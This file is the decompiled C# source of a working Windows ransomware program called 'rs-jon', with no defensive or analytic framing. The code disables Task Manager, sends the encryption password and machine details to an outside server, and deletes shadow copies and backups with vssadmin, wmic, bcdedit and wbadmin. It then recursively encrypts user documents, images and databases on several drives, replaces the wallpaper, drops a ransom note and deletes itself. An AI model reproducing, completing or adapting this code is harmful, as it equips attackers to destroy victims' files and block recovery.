using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace rs_jon;

public class Form1 : Form
{
	public enum ToggleForTaskManager
	{
		Enabled,
		Disabled
	}

	public static class RegEdit
	{
		public static RegistryKey SetKeyForTaskMngr(ToggleForTaskManager command)
		{
			string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			switch (command)
			{
			case ToggleForTaskManager.Enabled:
				registryKey.SetValue("DisableTaskMgr", 0);
				break;
			case ToggleForTaskManager.Disabled:
				registryKey.SetValue("DisableTaskMgr", 1);
				break;
			}
			return registryKey;
		}
	}

	private string extension = ".rsjon";

	private string targetURL = "http://rsxden.tk/rj/write.php";

	private string contactMail = "mymail@mail.com";

	private static string userDir = "C:\\";

	private static string userName = Environment.UserName;

	private static string path_1 = "Users\\";

	private static int encrpted = 0;

	private string desktoppath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private string documentpath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

	private string downloads = userDir + path_1 + Environment.UserName + "\\Downloads";

	private string user = Environment.UserName;

	public static string serial = "";

	private string computername = Environment.MachineName.ToString();

	private string userdir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\";

	public string tempnameofpayload = Path.GetTempFileName() + ".exe";

	private static uint SPI_SETDESKWALLPAPER = 20u;

	private static uint SPIF_UPDATEINIFILE = 1u;

	private IContainer components = null;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public Form1()
	{
		serial = serial_generator();
		InitializeComponent();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		RegistryKey registryKey = RegEdit.SetKeyForTaskMngr(ToggleForTaskManager.Disabled);
		registryKey.Close();
		File.Move(Assembly.GetEntryAssembly()!.Location, tempnameofpayload);
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		if (CheckInternetConnection())
		{
			startAction();
			self_destruck();
		}
		else
		{
			MessageBox.Show("This Program Needs Internet Connection. Please Try Again Later.", "Internet Connection Error!", (MessageBoxButtons)1, (MessageBoxIcon)16);
			Application.Exit();
		}
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public static string MD5Sifrele(string sifrelenecekMetin)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.UTF8.GetBytes(sifrelenecekMetin);
		bytes = mD5CryptoServiceProvider.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = bytes;
		foreach (byte b in array)
		{
			stringBuilder.Append(b.ToString("x2").ToLower());
		}
		return stringBuilder.ToString();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return MD5Sifrele(stringBuilder.ToString());
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + extension);
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[25]
			{
				".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
				".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
				".rtf", ".pdf", ".jpeg", ".mp3", ".gif"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string value = Path.GetExtension(files[i]);
				if (source.Contains(value))
				{
					EncryptFile(files[i], password);
					encrpted++;
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public static bool CheckInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("http://rsxden.tk"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		SendPassword(password);
		del_shadows();
		Directory_Settings_Sending(password);
		killE(password);
		killD(password);
		killF(password);
		changewallpaper();
		messageCreator();
		RegistryKey registryKey = RegEdit.SetKeyForTaskMngr(ToggleForTaskManager.Enabled);
		registryKey.Close();
		password = null;
	}

	public void killE(string password)
	{
		try
		{
			if (Directory.Exists("E:\\"))
			{
				encryptDirectory("E:\\", password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void killD(string password)
	{
		try
		{
			if (Directory.Exists("D:\\"))
			{
				encryptDirectory("D:\\", password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void killF(string password)
	{
		try
		{
			if (Directory.Exists("F:\\"))
			{
				encryptDirectory("F:\\", password);
			}
		}
		catch (Exception)
		{
		}
	}

	private string serial_generator()
	{
		Random random = new Random();
		Random random2 = new Random();
		int num = random.Next(1000, 9999);
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		string text2 = "";
		for (int i = 0; i < 5; i++)
		{
			text2 += text[random2.Next(text.Length)];
		}
		string text3 = user + "-" + num + "-" + text2;
		return text3.ToString();
	}

	public void SendPassword(string password)
	{
		string text = "?computer_name=" + computername + "&serialnumber=" + serial + "&password=" + password + "&allow=3614";
		string address = targetURL + text;
		string text2 = new WebClient().DownloadString(address);
	}

	public void messageCreator()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\READ_ME_PLZ.txt";
		if (!File.Exists(text))
		{
			string[] contents = new string[5]
			{
				$"Files has been encrypted with rs-jon. Total: {encrpted} files",
				"Your serial number is " + serial,
				"My ransom is very simple. Please go to the nearest animal shelter and record the animals there as a video or picture while feeding.",
				"then send me mail via your serial number and evidence. Including pet food voucher",
				"Contact: " + contactMail
			};
			File.WriteAllLines(text, contents);
			Process.Start(text);
		}
	}

	public void del_shadows()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "/C vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet & wbadmin delete systemstatebackup & wbadmin delete systemstatebackup -keepversions:0 & wbadmin delete backup";
		Process.Start(processStartInfo);
	}

	public void self_destruck()
	{
		string text = Path.GetTempFileName() + ".bat";
		using (StreamWriter streamWriter = new StreamWriter(text))
		{
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("CD " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			streamWriter.WriteLine("DEL \"" + tempnameofpayload + "\"  /f /q");
			streamWriter.WriteLine("CD " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex");
			streamWriter.WriteLine("DEL \"wallpaper.jpg\" /f /q ");
			streamWriter.WriteLine("CD " + Path.GetTempPath());
			streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = text,
			CreateNoWindow = true,
			ErrorDialog = false,
			UseShellExecute = false,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		Environment.Exit(0);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void changewallpaper()
	{
		Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex");
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ex\\wallpaper.jpg";
		((Image)Resource1.wallpaper).Save(text);
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 1u, text, SPIF_UPDATEINIFILE | 2u);
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string text2 = userDir + text + userName + "\\Desktop";
		string text3 = userDir + text + userName + "\\Links";
		string text4 = userDir + text + userName + "\\Contacts";
		string text5 = userDir + text + userName + "\\Desktop";
		string text6 = userDir + text + userName + "\\Documents";
		string text7 = userDir + text + userName + "\\Downloads";
		string text8 = userDir + text + userName + "\\Pictures";
		string text9 = userDir + text + userName + "\\Music";
		string text10 = userDir + text + userName + "\\OneDrive";
		string text11 = userDir + text + userName + "\\Saved Games";
		string text12 = userDir + text + userName + "\\Favorites";
		string text13 = userDir + text + userName + "\\Searches";
		string text14 = userDir + text + userName + "\\Videos";
		encryptDirectory("C:\\Users", password);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 0));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
